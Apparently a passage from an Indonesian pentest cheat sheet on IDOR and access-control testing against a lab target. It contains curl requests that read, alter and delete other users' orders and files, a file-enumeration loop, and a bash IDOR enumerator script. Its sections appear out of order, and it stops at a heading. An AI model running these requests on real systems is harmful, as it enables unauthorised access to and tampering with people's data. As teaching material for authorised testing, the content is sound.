## Chain Example 1 — IDOR + File Download

```text
Login as User A
       ↓
Find /api/files/100
       ↓
Change 100 → 101
       ↓
Retrieve User B file
       ↓
Private document
       ↓
Credentials / sensitive information
```

---

## Chain Example 2 — IDOR + LFI

```text
IDOR
 ↓
discover private file path
 ↓
LFI
 ↓
include/read internal file
```

Cross-reference:

← [File 24: LFI/RFI](/docs/lfi-rfi)

---

## Chain Example 3 — IDOR + File Upload

```text
IDOR
 ↓
access another account's upload
 ↓
find uploaded server-side file
 ↓
execution/LFI/parser opportunity
```

Cross-reference:

← [File 25: File Upload](/docs/file-upload)

---

## Chain Example 4 — IDOR + SSRF

```text
IDOR
 ↓
access another user's integration
 ↓
modify integration target
 ↓
server makes request
 ↓
SSRF
```

Cross-reference:

← [File 22: SSRF](/docs/ssrf)

---

## Chain Example 5 — IDOR + SSTI

```text
IDOR
 ↓
access another user's template
 ↓
modify template
 ↓
render
 ↓
SSTI
 ↓
RCE
```

Cross-reference:

← [File 23: SSTI](/docs/ssti)

---

## Chain Example 6 — IDOR + Command Injection

```text
IDOR
 ↓
access another user's network diagnostic job
 ↓
modify host/command-related parameter
 ↓
Command Injection
 ↓
RCE
```

Cross-reference:

← [File 26: Command Injection](/docs/command-injection)

---

## Chain Example 7 — IDOR + SQL Injection

```text
IDOR
 ↓
reach object-specific endpoint
 ↓
hidden parameter discovered
 ↓
SQL Injection
 ↓
data extraction
```

Cross-reference:

```text
./[🔥 20 — XSS Workflow](/docs/xss)
```

---

## Chain Example 8 — IDOR + JWT

```text
IDOR
 ↓
discover account identifier
 ↓
JWT contains same identity
 ↓
authorization inconsistency
 ↓
privilege escalation
```

Next:

→ [File 28: JWT](/docs/jwt)

---

# ⚡ 11 — One-Line Muscle Memory

```text
FIND OBJECT → FIND OWNER → ESTABLISH BASELINE → CHANGE REFERENCE → COMPARE RESPONSE → PROVE AUTHORIZATION FAILURE → TEST HORIZONTAL/VERTICAL → CHECK OTHER METHODS → CHAIN IMPACT
```

Atau versi super singkat:

```text
WHO OWNS IT? → WHAT REFERENCES IT? → CAN I CHANGE IT? → DOES SERVER CHECK OWNERSHIP?
```

---

# 🚀 60-Second IDOR Workflow

```text
IDOR FOUND
    │
    ▼
Find object reference
    │
    ▼
Identify current user
    │
    ▼
Identify own object
    │
    ▼
Find second user's object
    │
    ▼
Replay own request
    │
    ▼
Change object reference
    │
    ├───────────────┐
    │               │
    ▼               ▼
Returns B      403 / 404
    │               │
    ▼               ▼
IDOR           Investigate
confirmed      authorization
    │               │
    ▼               ├── other HTTP method
Horizontal/     ├── alternate endpoint
Vertical        ├── API version
    │           ├── parser discrepancy
    ▼           └── forced browsing
Impact
    │
    ├── private data
    ├── files
    ├── account actions
    ├── admin function
    └── chained vulnerability
```

---

# 🎯 Final Mental Model

Jangan menghafal:

```text
?id=123
```

sebagai inti IDOR.

Yang harus menjadi refleks:

```text
CLIENT-CONTROLLED REFERENCE
            ↓
       OBJECT LOOKUP
            ↓
    WHO OWNS THIS OBJECT?
            ↓
      AUTHORIZATION?
        /         \
      YES          NO
       │            │
       ▼            ▼
    BLOCK         DATA
                    ↓
                 IDOR/BAC
```

Ketika melihat:

```text
/user/123
/order/900
/file/abc
invoice_id=42
account_id=17
user_id=100
recipient_id=20
document=report.pdf
```

jangan bertanya:

> "Bisa saya ganti?"

Pertanyaan yang lebih tepat:

> **"Apa object ini, siapa pemiliknya, dan apakah server benar-benar memeriksa bahwa saya berhak mengaksesnya?"**

Itulah inti **IDOR dan Broken Access Control**.

---
# 27 — IDOR / Access Control Complete Attack Workflow 🔐

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="http://10.10.11.200"
export TARGET_IP="10.10.11.200"
export LHOST="10.10.14.5"

# Setup session files untuk dua user
mkdir -p ~/idor_loot/{responses,sessions,scripts,evidence}
cd ~/idor_loot

echo "[*] Target: $TARGET | LHOST: $LHOST"
```

**Output yang diharapkan:**

text

```
[*] Target: http://10.10.11.200 | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════

## FASE 0: INITIAL RECON — KENALI APLIKASI

## ═══════════════════════════════════════

> **Tujuan:** Sebelum bisa test IDOR, kamu harus tahu struktur aplikasinya dulu. IDOR tidak bisa ditest tanpa memahami object reference yang ada.

### Langkah 0.1 — Web Recon Dasar

Bash

```
# Command 1: Cek teknologi yang digunakan
curl -sI $TARGET | grep -i "server\|x-powered\|content-type\|set-cookie"

# Command 2: Cek robots.txt
curl -s $TARGET/robots.txt

# Command 3: Ambil source HTML halaman utama
curl -s $TARGET -o ~/idor_loot/index.html
grep -Eo '(src|href|action)="[^"]*"' ~/idor_loot/index.html | sort -u
```

**OUTPUT BERHASIL ✅ — Response header terlihat:**

text

```
Server: nginx/1.18.0
X-Powered-By: PHP/8.0.3
Set-Cookie: session=abc123; HttpOnly; Secure
Content-Type: text/html; charset=UTF-8
```

**Cara baca output:**

| Header                  | Nilai          | Arti & Tindakan                             |
| ----------------------- | -------------- | ------------------------------------------- |
| `X-Powered-By: Express` | Node.js        | JSON-based API, cek GraphQL                 |
| `Set-Cookie: session=`  | Session cookie | Simpan untuk curl -b                        |
| `Set-Cookie: jwt=`      | JWT auth       | → Ke Fase 3.3 (JWT Claims)                  |
| `Server: nginx`         | Reverse proxy  | Mungkin ada path normalization bypass       |
| `X-Powered-By: PHP`     | PHP backend    | Mass assignment via POST body lebih mungkin |

**OUTPUT GAGAL ❌ — Connection refused:**

text

```
curl: (7) Failed to connect to 10.10.11.200 port 80
```

➡️ Coba port lain:

Bash

```
curl -sI http://$TARGET_IP:8080
curl -sI https://$TARGET_IP
curl -sI http://$TARGET_IP:3000   # Node.js common port
```

---

### Langkah 0.2 — Directory & Endpoint Discovery

Bash

```
# Command 1: Fuzzing direktori umum
ffuf -u $TARGET/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,204,301,302,307,401,403 \
  -o ~/idor_loot/ffuf_dirs.json \
  -of json

# Command 2: Cari endpoint API
ffuf -u $TARGET/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,400,401,403,405 \
  -t 50

# Command 3: Cek JS bundle untuk route tersembunyi
curl -s $TARGET -o /tmp/index.html
grep -Eo 'src="[^"]*\.js[^"]*"' /tmp/index.html
# Ambil JS bundle
curl -s $TARGET/static/app.js -o ~/idor_loot/app.js 2>/dev/null
curl -s $TARGET/js/main.js -o ~/idor_loot/main.js 2>/dev/null

# Command 4: Extract endpoint dari JS
grep -Eo '(/api/|/admin/|/v[0-9]/)[A-Za-z0-9_./-]+' ~/idor_loot/app.js \
  | sort -u | tee ~/idor_loot/js_endpoints.txt
```

**OUTPUT BERHASIL ✅ — Endpoint ditemukan:**

text

```
/admin          [Status: 403, Size: 274]
/api            [Status: 301, Size: 312]
/api/users      [Status: 200, Size: 921]
/api/orders     [Status: 401, Size: 89]
/dashboard      [Status: 302, Size: 0]
/profile        [Status: 200, Size: 1204]
```

**Cara baca dan tindakan:**

|Status|Endpoint|Tindakan|
|---|---|---|
|`403`|`/admin`|**JANGAN SKIP!** → Coba method bypass nanti|
|`401`|`/api/orders`|Butuh auth → login dulu, test dengan token|
|`301/302`|`/dashboard`|Follow redirect → lihat destination|
|`200`|`/api/users`|**Prioritas utama** → cek IDOR|
|`405`|apapun|Method not allowed → coba POST/PUT/PATCH|

**OUTPUT dari JS bundle:**

text

```
/api/users
/api/admin/users
/api/orders
/api/files
/api/admin/delete
```

➡️ `/api/admin/users` dari JS = **TARGET UTAMA** untuk vertical access control test!

---

### Langkah 0.3 — Identifikasi Authentication Type

Bash

```
# Coba akses tanpa auth
curl -si $TARGET/api/users

# Coba akses dashboard
curl -si $TARGET/dashboard -L
```

**OUTPUT BERHASIL ✅ — Session Cookie auth:**

text

```
HTTP/1.1 302 Found
Location: /login
Set-Cookie: PHPSESSID=abc123
```

➡️ Ini session-based. Kita butuh login dulu. Lanjut ke **Fase 1**.

**OUTPUT BERHASIL ✅ — JWT Bearer auth:**

text

```
HTTP/1.1 401 Unauthorized
{"error": "Bearer token required"}
```

➡️ Ini JWT-based. Login akan return token. Setelah dapat token → ke **Fase 3.3**.

**OUTPUT BERHASIL ✅ — Langsung 200 tanpa auth:**

text

```
HTTP/1.1 200 OK
[{"id":1,"username":"admin",...}]
```

➡️ **JACKPOT!** Endpoint tidak butuh auth sama sekali → catat sebagai **Missing Auth** vulnerability. Lanjut test IDOR langsung ke **Fase 4**.

---

## ═══════════════════════════════════════

## FASE 1: SETUP DUA AKUN (FUNDAMENTAL!)

## ═══════════════════════════════════════

> **Mengapa dua akun?** IDOR tidak bisa dibuktikan tanpa membandingkan object ownership. Satu akun saja tidak cukup untuk membuktikan unauthorized access.

### Langkah 1.1 — Register User A

Bash

```
# Method 1: JSON registration
curl -si \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"pentest_userA","password":"TestPass123!","email":"userA@test.com"}' \
  $TARGET/register \
  -c ~/idor_loot/sessions/userA.cookies \
  | tee ~/idor_loot/responses/register_A.txt

# Method 2: Form-based registration
curl -si \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=pentest_userA&password=TestPass123!&email=userA@test.com' \
  $TARGET/register \
  -c ~/idor_loot/sessions/userA.cookies
```

**OUTPUT BERHASIL ✅:**

text

```
HTTP/1.1 201 Created
{"id":100,"username":"pentest_userA","email":"userA@test.com"}
```

➡️ **SIMPAN INFO INI:**

Bash

```
export USER_A_ID="100"
export USER_A="pentest_userA"
export PASS_A="TestPass123!"
echo "User A ID: $USER_A_ID" >> ~/idor_loot/evidence/notes.txt
```

**OUTPUT GAGAL ❌ — Registration disabled:**

text

```
HTTP/1.1 403 Forbidden
{"error": "Registration is closed"}
```

➡️ Ini CTF/lab yang kasih satu akun. Gunakan akun yang sudah dikasih. Untuk test horizontal IDOR, kamu butuh creds dua user berbeda. Cari di deskripsi challenge atau buat via admin panel jika bisa akses.

**OUTPUT GAGAL ❌ — Email validation:**

text

```
{"error": "Please use a valid email domain"}
```

➡️ Coba email lain:

Bash

```
-d '{"username":"pentest_userA","password":"TestPass123!","email":"userA@example.com"}'
# Atau:
-d '{"username":"pentest_userA","password":"TestPass123!","email":"userA@corp.local"}'
```

---

### Langkah 1.2 — Register User B

Bash

```
curl -si \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"pentest_userB","password":"TestPass456!","email":"userB@test.com"}' \
  $TARGET/register \
  -c ~/idor_loot/sessions/userB.cookies \
  | tee ~/idor_loot/responses/register_B.txt
```

**OUTPUT BERHASIL ✅:**

text

```
HTTP/1.1 201 Created
{"id":101,"username":"pentest_userB","email":"userB@test.com"}
```

Bash

```
export USER_B_ID="101"
export USER_B="pentest_userB"
export PASS_B="TestPass456!"
echo "User B ID: $USER_B_ID" >> ~/idor_loot/evidence/notes.txt
```

---

### Langkah 1.3 — Login & Simpan Session

Bash

```
# Login User A
curl -si \
  -X POST \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"$USER_A\",\"password\":\"$PASS_A\"}" \
  $TARGET/login \
  -c ~/idor_loot/sessions/userA.cookies \
  -b ~/idor_loot/sessions/userA.cookies \
  | tee ~/idor_loot/responses/login_A.txt

# Login User B
curl -si \
  -X POST \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"$USER_B\",\"password\":\"$PASS_B\"}" \
  $TARGET/login \
  -c ~/idor_loot/sessions/userB.cookies \
  -b ~/idor_loot/sessions/userB.cookies \
  | tee ~/idor_loot/responses/login_B.txt
```

**OUTPUT BERHASIL ✅ — Session Cookie:**

text

```
HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGc...; HttpOnly; Path=/
{"id":100,"username":"pentest_userA","role":"user"}
```

Bash

```
# Ekstrak token jika JWT
export TOKEN_A=$(cat ~/idor_loot/responses/login_A.txt | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
export TOKEN_B=$(cat ~/idor_loot/responses/login_B.txt | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
echo "Token A: $TOKEN_A"
echo "Token B: $TOKEN_B"
```

**OUTPUT BERHASIL ✅ — JWT response:**

JSON

```
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAi...",
  "token_type": "bearer"
}
```

➡️ Lanjut ke **Fase 3.3** untuk decode dan analisis JWT claims.

**OUTPUT GAGAL ❌ — Invalid credentials:**

text

```
HTTP/1.1 401 Unauthorized
{"error": "Invalid username or password"}
```

➡️ Cek apakah password benar, atau coba dengan field name berbeda:

Bash

```
# Coba variasi field name
-d '{"user":"pentest_userA","pass":"TestPass123!"}'
-d '{"email":"userA@test.com","password":"TestPass123!"}'
```

---

## ═══════════════════════════════════════

## FASE 2: IDENTIFIKASI OBJECT REFERENCES

## ═══════════════════════════════════════

> **Tujuan:** Temukan SEMUA tempat di mana aplikasi menggunakan object reference yang bisa dimanipulasi. Ini adalah fase paling penting sebelum testing.

### Langkah 2.1 — Map Semua Object Reference sebagai User A

Bash

```
# Browse sebagai User A, catat semua endpoint
# Command 1: Profile endpoint
curl -si -b ~/idor_loot/sessions/userA.cookies \
  $TARGET/api/users/$USER_A_ID \
  | tee ~/idor_loot/responses/profile_A.txt

# Command 2: Lihat semua resource user A
curl -si -b ~/idor_loot/sessions/userA.cookies \
  $TARGET/api/orders \
  | tee ~/idor_loot/responses/orders_A.txt

curl -si -b ~/idor_loot/sessions/userA.cookies \
  $TARGET/api/files \
  | tee ~/idor_loot/responses/files_A.txt

# Command 3: Cari ID patterns di semua response
grep -Eo '"(id|user_id|order_id|file_id|account_id|document_id)":[0-9]+' \
  ~/idor_loot/responses/*.txt | sort -u

# Command 4: Cari UUID patterns
grep -Eoi '[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}' \
  ~/idor_loot/responses/*.txt | sort -u

# Command 5: Cari Base64 patterns
grep -Eo '"[A-Za-z0-9+/]{10,}={0,2}"' \
  ~/idor_loot/responses/*.txt | head -20
```

**OUTPUT BERHASIL ✅ — Object IDs ditemukan:**

JSON

```
{
  "user": {"id": 100, "username": "pentest_userA"},
  "orders": [
    {"order_id": 1042, "total": 500000},
    {"order_id": 1043, "total": 200000}
  ],
  "files": [
    {"file_id": "abc123", "name": "report.pdf"},
    {"file_id": "def456", "name": "invoice.pdf"}
  ]
}
```

➡️ **SIMPAN DAN CATAT:**

Bash

```
export OWN_ORDER_ID="1042"
export OWN_FILE_ID="abc123"
echo "User A owns: order_id=$OWN_ORDER_ID, file_id=$OWN_FILE_ID" \
  >> ~/idor_loot/evidence/notes.txt
```

---

### Langkah 2.2 — Map Object Reference User B (Baseline Komparasi)

Bash

```
# Browse sebagai User B untuk tahu object ID-nya
curl -si -b ~/idor_loot/sessions/userB.cookies \
  $TARGET/api/users/$USER_B_ID \
  | tee ~/idor_loot/responses/profile_B.txt

curl -si -b ~/idor_loot/sessions/userB.cookies \
  $TARGET/api/orders \
  | tee ~/idor_loot/responses/orders_B.txt

# Extract B's object IDs
grep -Eo '"order_id":[0-9]+' ~/idor_loot/responses/orders_B.txt
```

**OUTPUT BERHASIL ✅:**

JSON

```
{
  "orders": [{"order_id": 1044, "total": 900000}],
  "files": [{"file_id": "ghi789", "name": "contract.pdf"}]
}
```

Bash

```
export OTHER_ORDER_ID="1044"
export OTHER_FILE_ID="ghi789"
echo "User B owns: order_id=$OTHER_ORDER_ID, file_id=$OTHER_FILE_ID" \
  >> ~/idor_loot/evidence/notes.txt
```

---

### Langkah 2.3 — ID Pattern Recognition

Bash

```
# Identifikasi tipe ID yang ditemukan
python3 << 'EOF'
import re, base64, binascii

ids_to_check = ["1042", "abc123", "MTIz", "c4ca4238a0b923820dcc509a6f75849b"]

for id_val in ids_to_check:
    print(f"\n[*] Checking: {id_val}")
    
    # Check numeric (sequential)
    if id_val.isdigit():
        print(f"    -> NUMERIC/SEQUENTIAL: Try {int(id_val)-1} to {int(id_val)+5}")
    
    # Check MD5 (32 hex chars)
    if re.match(r'^[0-9a-f]{32}$', id_val, re.I):
        print(f"    -> MD5 HASH: Check if predictable input (md5(1), md5(2), etc)")
    
    # Check Base64
    try:
        decoded = base64.b64decode(id_val + "==").decode()
        print(f"    -> BASE64: Decoded = '{decoded}' → Modify then re-encode")
    except:
        pass
    
    # Check UUID
    if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$', id_val, re.I):
        print(f"    -> UUID: Not guessable but check for UUID leak in other endpoints")
    
    # Check hex
    if re.match(r'^[0-9a-f]{6,}$', id_val, re.I) and not id_val.isdigit():
        print(f"    -> HEX: Decode = '{bytes.fromhex(id_val).decode(errors='replace')}'")
EOF
```

**Output yang menunjukkan Base64:**

text

```
[*] Checking: MTIz
    -> BASE64: Decoded = '123' → Modify then re-encode
```

➡️ **Jika Base64:**

Bash

```
# Encode ID baru untuk test
python3 -c "import base64; print(base64.b64encode(b'124').decode())"
# Output: MTI0

# Sekarang test dengan ID yang di-encode
curl -si -b ~/idor_loot/sessions/userA.cookies \
  "$TARGET/api/users/MTI0"
```

---

## ═══════════════════════════════════════

## FASE 3: HORIZONTAL IDOR TESTING

## ═══════════════════════════════════════

> **Tujuan:** User A mencoba mengakses object milik User B dengan privilege yang sama (horizontal). Ini adalah IDOR paling klasik.

### Langkah 3.1 — Basic IDOR Test (GET)

Bash

```
# LANGKAH WAJIB: Selalu GET own object dulu sebagai baseline!

# Step 1: Baseline — akses object milik sendiri (User A)
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  $TARGET/api/orders/$OWN_ORDER_ID \
  -o ~/idor_loot/responses/own_order.txt \
  -w "STATUS:%{http_code} SIZE:%{size_download}\n"

# Step 2: IDOR attempt — akses object milik User B dengan session User A!
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  $TARGET/api/orders/$OTHER_ORDER_ID \
  -o ~/idor_loot/responses/other_order.txt \
  -w "STATUS:%{http_code} SIZE:%{size_download}\n"

# Step 3: Bandingkan
diff ~/idor_loot/responses/own_order.txt ~/idor_loot/responses/other_order.txt
echo "--- Size comparison ---"
wc -c ~/idor_loot/responses/own_order.txt ~/idor_loot/responses/other_order.txt
```

**OUTPUT BERHASIL ✅ — IDOR CONFIRMED:**

text

```
STATUS:200 SIZE:219

# Content other_order.txt:
{
  "order_id": 1044,
  "owner_id": 101,     <-- ini milik User B!
  "total": 900000,
  "status": "pending",
  "items": [...]
}
```

➡️ **IDOR CONFIRMED! SIMPAN EVIDENCE:**

Bash

```
echo "=== IDOR CONFIRMED ===" >> ~/idor_loot/evidence/idor_proof.txt
echo "Endpoint: GET $TARGET/api/orders/$OTHER_ORDER_ID" >> ~/idor_loot/evidence/idor_proof.txt
echo "Session used: User A (ID: $USER_A_ID)" >> ~/idor_loot/evidence/idor_proof.txt
echo "Object owner: User B (ID: $USER_B_ID)" >> ~/idor_loot/evidence/idor_proof.txt
cat ~/idor_loot/responses/other_order.txt >> ~/idor_loot/evidence/idor_proof.txt

# Screenshot untuk report (jika GUI)
# Lanjut test PUT/PATCH/DELETE juga!
```

**OUTPUT AMAN ✅ — Not vulnerable:**

text

```
STATUS:403 SIZE:48
{"error": "Forbidden"}
# ATAU
STATUS:404 SIZE:32
{"error": "Order not found"}
```

> ⚠️ **PENTING:** 403 dan 404 **keduanya mungkin benar atau mungkin menyembunyikan object!** Gunakan User B untuk konfirmasi bahwa `$OTHER_ORDER_ID` memang valid:

Bash

```
# Konfirmasi bahwa order 1044 memang exist (akses dengan User B)
curl -si -b ~/idor_loot/sessions/userB.cookies \
  $TARGET/api/orders/$OTHER_ORDER_ID
# Jika 200 → server menyembunyikan dari User A (authorization bekerja)
# Jika 404 → order memang tidak ada
```

**OUTPUT GAGAL ❌ — Rate limiting:**

text

```
HTTP/1.1 429 Too Many Requests
Retry-After: 60
```

➡️ Tambahkan delay:

Bash

```
sleep 2 && curl -si -b ~/idor_loot/sessions/userA.cookies \
  $TARGET/api/orders/$OTHER_ORDER_ID
```

---

### Langkah 3.2 — IDOR Test Semua HTTP Methods

> **Kritis:** Authorization bisa benar di GET tapi salah di PUT/PATCH/DELETE!

Bash

```
# Test PUT (modify object milik user lain)
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  -X PUT \
  -H 'Content-Type: application/json' \
  -d '{"total":1,"status":"cancelled"}' \
  $TARGET/api/orders/$OTHER_ORDER_ID \
  | tee ~/idor_loot/responses/put_other_order.txt

# Test PATCH (partial update)
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  -X PATCH \
  -H 'Content-Type: application/json' \
  -d '{"status":"completed"}' \
  $TARGET/api/orders/$OTHER_ORDER_ID \
  | tee ~/idor_loot/responses/patch_other_order.txt

# Test DELETE — HATI-HATI, hanya test di lab!
# Buat object dummy dulu untuk delete test
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  -X DELETE \
  $TARGET/api/orders/$OTHER_ORDER_ID \
  | tee ~/idor_loot/responses/delete_other_order.txt

# Test POST (create dengan owner_id orang lain)
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  -X POST \
  -H 'Content-Type: application/json' \
  -d "{\"owner_id\":$USER_B_ID,\"item\":\"test\"}" \
  $TARGET/api/orders \
  | tee ~/idor_loot/responses/post_as_B.txt
```

**OUTPUT BERHASIL ✅ — Method-specific IDOR (GET aman tapi PATCH vulnerable):**

text

```
# GET → 403 Forbidden (aman)
# PATCH → 200 OK   ← IDOR!
{"order_id": 1044, "status": "completed", "message": "Updated successfully"}
```

➡️ Ini adalah **method-specific authorization bug** → catat sebagai finding terpisah!

**OUTPUT GAGAL ❌ — 405 Method Not Allowed:**

text

```
HTTP/1.1 405 Method Not Allowed
Allow: GET, POST
```

➡️ Method tidak didukung untuk endpoint ini. Skip dan coba endpoint lain.

---

### Langkah 3.3 — IDOR pada File Download

Bash

```
# Baseline: download file milik sendiri
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  "$TARGET/api/files/$OWN_FILE_ID" \
  -o ~/idor_loot/own_file.bin \
  -w "STATUS:%{http_code} TYPE:%{content_type} SIZE:%{size_download}\n"

# IDOR attempt: download file milik User B
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  "$TARGET/api/files/$OTHER_FILE_ID" \
  -o ~/idor_loot/other_file.bin \
  -w "STATUS:%{http_code} TYPE:%{content_type} SIZE:%{size_download}\n"

# Alternatif via query param
curl -si \
  -b ~/idor_loot/sessions/userA.cookies \
  "$TARGET/download?file=report_101.pdf" \
  -o ~/idor_loot/download_other.bin

# Bandingkan ukuran
wc -c ~/idor_loot/own_file.bin ~/idor_loot/other_file.bin

# Cek tipe file
file ~/idor_loot/other_file.bin
# Jika PDF: cek isinya
strings ~/idor_loot/other_file.bin | head -50
```

**OUTPUT BERHASIL ✅ — File IDOR confirmed:**

text

```
STATUS:200 TYPE:application/pdf SIZE:45231
# File berisi data milik User B!
```

**OUTPUT BERHASIL ✅ — Ketemu numeric filename pattern:**

text

```
/download?file=report_100.pdf   → User A's file (200)
/download?file=report_101.pdf   → User B's file (200) ← IDOR!
/download?file=report_102.pdf   → User C's file (200) ← IDOR!
```

➡️ Gunakan **idor_test.sh** untuk enumerate range:

Bash

```
# Buat script test otomatis untuk file download
for i in $(seq 95 110); do
  STATUS=$(curl -so /dev/null \
    -b ~/idor_loot/sessions/userA.cookies \
    -w "%{http_code}" \
    "$TARGET/download?file=report_${i}.pdf")
  SIZE=$(curl -so /tmp/file_${i}.pdf \
    -b ~/idor_loot/sessions/userA.cookies \
    -w "%{size_download}" \
    "$TARGET/download?file=report_${i}.pdf" 2>/dev/null)
  echo "file_${i}.pdf → STATUS:$STATUS SIZE:$SIZE"
done
```

---

### Langkah 3.4 — Automated IDOR Scanning dengan idor_test.sh

Bash

```
# Buat script idor_test.sh
cat > ~/idor_loot/scripts/idor_test.sh << 'SCRIPT'
#!/usr/bin/env bash
set -u

usage() {
  cat << 'EOF'
Usage: ./idor_test.sh <base_url> <param_or_path> <start_id> <end_id> [cookie_file]

Examples:
  # Query param mode (?id=100)
  ./idor_test.sh "http://TARGET/api/users" "id" 95 110 userA.cookies
  
  # Path mode (/api/users/100)
  PATH_MODE=true ./idor_test.sh "http://TARGET/api/users" "" 95 110 userA.cookies
  
  # With delay (rate limiting bypass)
  DELAY=1 ./idor_test.sh "http://TARGET/api/orders" "order_id" 1040 1050 userA.cookies
EOF
  exit 1
}

[[ $# -lt 4 ]] && usage

PATH_MODE="${PATH_MODE:-false}"
DELAY="${DELAY:-0}"
BASE_URL="$1"
PARAM="$2"
START_ID="$3"
END_ID="$4"
COOKIE_FILE="${5:-}"

# Validate
[[ ! "$START_ID" =~ ^[0-9]+$ ]] && echo "[!] START_ID must be numeric" && exit 1
[[ ! "$END_ID" =~ ^[0-9]+$ ]] && echo "[!] END_ID must be numeric" && exit 1
(( START_ID > END_ID )) && echo "[!] START_ID must be <= END_ID" && exit 1

OUTPUT_DIR="idor_results"
mkdir -p "$OUTPUT_DIR"
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"
RESULT_FILE="$OUTPUT_DIR/idor_${TIMESTAMP}.tsv"

# Build curl args
CURL_ARGS=(-sS --max-time 15)
[[ -n "$COOKIE_FILE" ]] && CURL_ARGS+=(-b "$COOKIE_FILE")

# Baseline
if [[ "$PATH_MODE" == "true" ]]; then
  BASELINE_URL="${BASE_URL}/${START_ID}"
else
  BASELINE_URL="${BASE_URL}?${PARAM}=${START_ID}"
fi

echo "============================================================"
echo " IDOR GET Enumerator — AUTHORIZED CTF/LAB ONLY"
echo "============================================================"
echo "[*] Target : $BASE_URL"
echo "[*] Range  : $START_ID → $END_ID"
echo

BASELINE_META=$(curl "${CURL_ARGS[@]}" -o /tmp/idor_base.$$ \
  -w '%{http_code}\t%{size_download}' "$BASELINE_URL")
BASELINE_STATUS="${BASELINE_META%%$'\t'*}"
BASELINE_LENGTH="${BASELINE_META##*$'\t'}"

echo "[+] Baseline: STATUS=$BASELINE_STATUS LENGTH=$BASELINE_LENGTH"
echo

printf 'ID\tSTATUS\tLENGTH\tFLAG\tURL\n' > "$RESULT_FILE"

for (( ID=START_ID; ID<=END_ID; ID++ )); do
  [[ "$DELAY" -gt 0 ]] 2>/dev/null && sleep "$DELAY"
  
  if [[ "$PATH_MODE" == "true" ]]; then
    TARGET_URL="${BASE_URL}/${ID}"
  else
    TARGET_URL="${BASE_URL}?${PARAM}=${ID}"
  fi
  
  META=$(curl "${CURL_ARGS[@]}" -o /tmp/idor_body.$$ \
    -w '%{http_code}\t%{size_download}' "$TARGET_URL" 2>/dev/null)
  
  STATUS="${META%%$'\t'*}"
  LENGTH="${META##*$'\t'}"
  FLAG="NORMAL"
  
  [[ "$STATUS" != "$BASELINE_STATUS" ]] && FLAG="DIFF_STATUS"
  [[ "$LENGTH" != "$BASELINE_LENGTH" ]] && FLAG="${FLAG},DIFF_LENGTH"
  
  printf '%s\t%s\t%s\t%s\t%s\n' "$ID" "$STATUS" "$LENGTH" "$FLAG" "$TARGET_URL" \
    >> "$RESULT_FILE"
  
  if [[ "$FLAG" != "NORMAL" ]]; then
    echo "[!] ID=$ID STATUS=$STATUS LENGTH=$LENGTH FLAG=$FLAG"
    # Save interesting response body
    cp /tmp/idor_body.$$ "$OUTPUT_DIR/response_id${ID}.json" 2>/dev/null
  else
    echo "[.] ID=$ID STATUS=$STATUS LENGTH=$LENGTH"
  fi
done

rm -f /tmp/idor_base.$$ /tmp/idor_body.$$

echo
echo "============================================================"
TOTAL=$(tail -n +2 "$RESULT_FILE" | wc -l)
DIFF=$(tail -n +2 "$RESULT_FILE" | awk -F'\t' '$4 != "NORMAL" {count++} END {print count+0}')
echo "[+] Total: $TOTAL | Interesting: $DIFF"
echo "[+] Saved: $RESULT_FILE"
echo "[!] Verify candidates manually with ownership context!"
SCRIPT

chmod +x ~/idor_loot/scripts/idor_test.sh

# Jalankan
~/idor_loot/scripts/idor_test.sh \
  "$TARGET/api/orders" \
  "order_id" \
  1040 \
  1050 \
  ~/idor_loot/sessions/userA.cookies
```

**Output yang diharapkan:**

text

```
============================================================
 IDOR GET Enumerator — AUTHORIZED CTF/LAB ONLY
============================================================
[*] Target : http://10.10.11.200/api/orders
[*] Range  : 1040 → 1050

[+] Baseline: STATUS=200 LENGTH=214

[.] ID=1040 STATUS=200 LENGTH=214
[.] ID=1041 STATUS=200 LENGTH=214
[!] ID=1042 STATUS=200 LENGTH=214 FLAG=NORMAL    ← Own order
[!] ID=1043 STATUS=404 LENGTH=32  FLAG=DIFF_STATUS,DIFF_LENGTH
[!] ID=1044 STATUS=200 LENGTH=219 FLAG=DIFF_LENGTH  ← IDOR candidate!
[.] ID=1045 STATUS=404 LENGTH=32
```

➡️ ID **1044** adalah candidate IDOR → verifikasi manual:

Bash

```
# Verifikasi: akses dengan User A session, bandingkan dengan User B session
curl -s -b ~/idor_loot/sessions/userA.cookies "$TARGET/api/orders/1044" | python3 -m json.tool
curl -s -b ~/idor_loot/sessions/userB.cookies "$TARGET/api/orders/1044" | python3 -m json.tool
```

---

## ═══════════════════════════════════════

## FASE 4: VERTICAL PRIVILEGE ESCALATION

## ═══════════════════════════════════════

